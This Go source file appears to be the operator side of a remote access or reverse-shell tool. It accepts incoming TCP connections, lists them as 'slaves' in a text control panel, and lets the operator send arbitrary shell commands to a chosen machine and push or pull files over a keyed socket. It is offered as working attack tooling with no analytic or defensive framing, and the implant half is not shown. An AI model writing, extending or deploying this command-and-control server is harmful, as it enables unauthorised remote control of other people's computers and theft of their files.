package main

import(
  "net"
  "fmt"
  "bufio"
  "os"
  "io"
  "strings"

  "./config"
  "./socket"
)

func connHandler(c net.Conn) {
  fmt.Printf("Connection from %v started. \n", c.RemoteAddr())
  if c == nil {
    return
  }

  reader := bufio.NewReader(os.Stdin)
  sock := socket.Init(c, config.Key)

  for true {
    fmt.Printf("%v$ ", c.RemoteAddr())
    input, _ := reader.ReadString('\n')
    input = strings.TrimSpace(input)

    switch strings.Split(input, " ")[0] {
    case "quit":
      return

    case "":
      continue

    case "push":
      sock.Write(input)
      cmds := strings.Split(input, "push")
      cmds[1] = strings.TrimSpace(cmds[1])
      sock.SendFile(cmds[1])

    case "pull":
      sock.Write(input)
      cmds := strings.Split(input, "pull")
      cmds[1] = strings.TrimSpace(cmds[1])
      sock.RecvFile(cmds[1])

    default:
      sock.Write(input)
    }

    resp, err := sock.Read()
    if err == io.EOF {
      break
    }

    fmt.Println(resp)
  }

  fmt.Printf("Connection from %v closed. \n", c.RemoteAddr())
}

func main(){
  server, err := net.Listen("tcp", config.ServerPort)
  if err != nil {
    fmt.Printf("Fail to start server, %s\n", err)
  }

  fmt.Println("Server Started ...")

  conns := make([]net.Conn, 0)
  go func(){
    for {
      conn, err := server.Accept()
      if err != nil {
        fmt.Printf("Fail to connect, %s\n", err)
        break
      }

      if(conn != nil){
        conns = append(conns, conn)
      }
    }
  }()

  for {
    fmt.Printf("\nControl Panel:\n")
    fmt.Printf("1. Show slaves.\n")
    fmt.Printf("2. Connect.\n")
    fmt.Printf("> ");

    var choice int
    fmt.Scanf("%d", &choice)

    if choice == 1 {
      fmt.Printf("\n")
      for k, v := range(conns) {
        fmt.Printf("%d: %v\n", k, v.RemoteAddr())
      }
    }else if choice == 2 {
      fmt.Printf("\n")
      fmt.Printf("ID> ")
      fmt.Scanf("%d", &choice)
      connHandler(conns[choice])
    }
  }
}

